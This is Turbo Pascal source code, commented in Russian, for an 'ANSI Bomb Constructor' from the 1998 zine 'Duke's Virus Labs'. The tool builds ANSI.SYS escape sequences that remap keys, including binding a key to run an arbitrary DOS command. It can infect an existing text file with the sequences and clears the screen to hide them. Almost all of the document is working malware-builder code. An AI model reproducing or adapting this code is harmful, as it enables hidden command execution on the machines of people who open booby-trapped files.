program ANSI_Bomb_Constructor_by_Duke;
uses  crt;
const NumberMenu=4;
var   i,j:integer;
      TextMenu:array[1..NumberMenu] of string[35];
      ch:char;
      EndWork: boolean;
      b:text;                                        {файл-бомба}
      old:boolean;                        {признак инфицирования}
      bom,st,t:string;
{-----------------------}
procedure SetNoCursor;assembler;        {делаем курсор невидимым}
asm
  mov ah,01h
  mov ch,32
  mov cl,3
  int 10h
end;
{-----------------------}
procedure SetNormalCursor;assembler;      {делаем курсор видимым}
asm
  mov ah,01h
  mov ch,7
  mov cl,8
  int 10h
end;
{-----------------------}
procedure WriteMenu;                         {вывод пунктов меню}
begin
gotoxy(2,i*2);write(TextMenu[i])
end;
{-----------------------}
procedure Menu1;                       {пункт меню "О программе"}
begin
Window(23,6,57,15);
ClrScr;
writeln;
writeln(' ANSI Bomb Constructor by Duke/SMF');
writeln('           version  1.0           ');
writeln;
writeln;
writeln('  Написано специально для журнала ');
writeln('   "Duke''s Virus Labs" issue 01   ');
writeln;
writeln('            26-07-1998            ');
repeat until keypressed;
while keypressed do readkey;
end;
{-----------------------}
procedure Otvet(var ch:char);        {получение ответа на вопрос}
begin
  ch:='3';
  while (ch<>'1') and (ch<>'2') do ch:=readkey;
  textcolor(4);
  writeln(ch);
  textcolor(15);
end;
{-----------------------}
function Analiz(n:integer):string;
         {анализируются нажатые клавиши с кодом из двух символов}
begin
case n of
  59: analiz:='F1';
  60: analiz:='F2';
  61: analiz:='F3';
  62: analiz:='F4';
  63: analiz:='F5';
  64: analiz:='F6';
  65: analiz:='F7';
  66: analiz:='F8';
  67: analiz:='F9';
  68: analiz:='F10';
  71: analiz:='Home';
  72: analiz:='Стрелка Вверх';
  73: analiz:='Page Up';
  79: analiz:='End';
  80: analiz:='Стрелка Вниз';
  81: analiz:='Page Down';
  82: analiz:='Insert';
  else analiz:=':*)';
  end;
end;
{-----------------------}
procedure Klavisha;                    {обработка нажатых клавиш}
var kod:integer;
    c,ch:char;
begin
textcolor(4);
ch:=readkey;
kod:=0;
write('"');
if ord(ch)=0 then
  begin
  c:=readkey;
  kod:=ord(c);
  write(analiz(kod));
  end
else write(ch);
writeln('"');
write(b,ord(ch));
if kod<>0 then write(b,';',kod);
textcolor(15);
end;
{-----------------------}
procedure Bomba;            {общая часть - начало создания бомбы}
begin
writeln;
writeln('Для ответа на вопрос нажимайте клавишу, указанную в '+
                                                      'скобках');
writeln('рядом с выбранным вариантом ответа.');
writeln;
write('Записывать в новый файл(1) или инфицировать старый(2)? ');
Otvet(ch);
old:=false;
if ch='2' then old:=true;{признак того, что сейчас мы инфицируем}
write('Введите имя файла для записи бомбы : ');
textcolor(4);
readln(st);
textcolor(15);
if old=true then begin t:=st;st:='temp';end;
assign(b,st);{$I-}reset(b);{$I+}
if (ioresult=0) and (old=false) then
 {уже существует, но мы не инфицируем}
 begin
 write('Файл уже существует. Добавить(1) или перезаписать(2)? ');
 Otvet(ch);
 if ch='1' then append(b) else rewrite(b);
 end
else
  begin
  write('Введите имя бомбы (нажмите "Enter", если имя не '+
                                                    'нужно) : ');
  textcolor(4);
  readln(bom);
  textcolor(15);
  rewrite(b);
  if bom<>'' then writeln(b,#27,'[0m',bom);
  end;
end;
{-----------------------}
procedure Vihod;                      {завершение создания бомбы}
var g:text;
    s:string;
begin
writeln(b,#27,'[2J');
if old=true then
  begin
  assign(g,t);reset(g);
  while not eof(g) do
    begin
    readln(g,s);
    writeln(b,s);
    end;
  close(g);
  erase(g);
  close(b);
  rename(b,t);
  end
else close(b);
write('Нажмите любую клавишу для выхода в главное меню...');
repeat until keypressed;
while keypressed do readkey;
end;
{-----------------------}
procedure Menu2;             {пункт меню "Переименование клавиш"}
label lab1;
begin
Window(1,1,80,25);
TextColor(15);
TextBackGround(0);
ClrScr;
GotoXY(25,1);
writeln('**** Переименование клавиш ****');
Bomba;
window(1,8,80,25);
lab1:
writeln;
write('Нажмите клавишу, которую вы хотите изменить    :');
write(b,#27,'[');
Klavisha;
write(b,';');
write('Нажмите клавишу, НА которую вы хотите изменить :');
Klavisha;
writeln(b,'p');
write('Будем изменять другие клавиши (1=Да, 2=Нет) ? ');
Otvet(ch);
if ch='1' then goto lab1;
Vihod;
end;
{-----------------------}
procedure Menu3;             {пункт меню "Выполнение DOS-команд"}
var st:string;
label lab2;
begin
Window(1,1,80,25);
TextColor(15);
TextBackGround(0);
ClrScr;
GotoXY(25,1);
writeln('**** Выполнение DOS-команд ****');
Bomba;
window(1,8,80,25);
lab2:
textcolor(15);
writeln;
write('Нажмите клавишу, которую вы хотите изменить : ');
write(b,#27,'[');
Klavisha;
write(b,';');
write('Введите команду DOS : ');
textcolor(4);
readln(st);
writeln(b,'"',st,'";13p');
textcolor(15);
write('Будем добавлять другие команды (1=Да, 2=Нет) ? ');
Otvet(ch);
if ch='1' then goto lab2;
Vihod;
end;
{-----------------------}
begin
SetNoCursor;
TextMenu[1]:='         О программе         ';
TextMenu[2]:='    Переименование клавиш    ';
TextMenu[3]:='    Выполнение DOS-команд    ';
TextMenu[4]:='        Выход из ABCD        ';
EndWork:=false;
repeat
  TextBackGround(3);
  ClrScr;
  TextColor(4);
  GotoXY(24,3);
  writeln('ANSI Bomb Constructor by Duke/SMF');
  TextColor(15);
  Window(26,7,56,15); { тень около окна меню }
  TextBackGround(0);
  ClrScr;
  Window(25,6,55,14); { окно вывода меню }
  TextBackGround(7);
  ClrScr;
  TextColor(4);       { вывод меню }
  for i:=1 to NumberMenu do WriteMenu;
  i:=1;      { изменение цвета первого пункта меню }
  TextColor(14);
  TextBackGround(1);
  WriteMenu;
  repeat
    ch:=ReadKey;
    if ch=#0 then
             begin
             ch:=ReadKey;
             case ch of
               #72 : begin { стрелка Вверх }
                     TextColor(4);
                     TextBackGround(7);
                     WriteMenu;
                     dec(i);
                     if i<1 then i:=NumberMenu;
                     TextColor(14);
                     TextBackGround(1);
                     WriteMenu;
                     end;
               #80 : begin { стрелка Вниз }
                     TextColor(4);
                     TextBackGround(7);
                     WriteMenu;
                     inc(i);
                     if i>NumberMenu then i:=1;
                     TextColor(14);
                     TextBackGround(1);
                     WriteMenu;
                     end;
             end;
    end;
  until ch=#13;
  case i of
       1 : Menu1;
       2 : Menu2;
       3 : Menu3;
       4 : EndWork:=true;
       end;
Window(1,1,80,25);
until EndWork;
{Возвращаем на место все измененные параметры:}
TextBackGround(0);
TextColor(7);
ClrScr;
SetNormalCursor;
end.
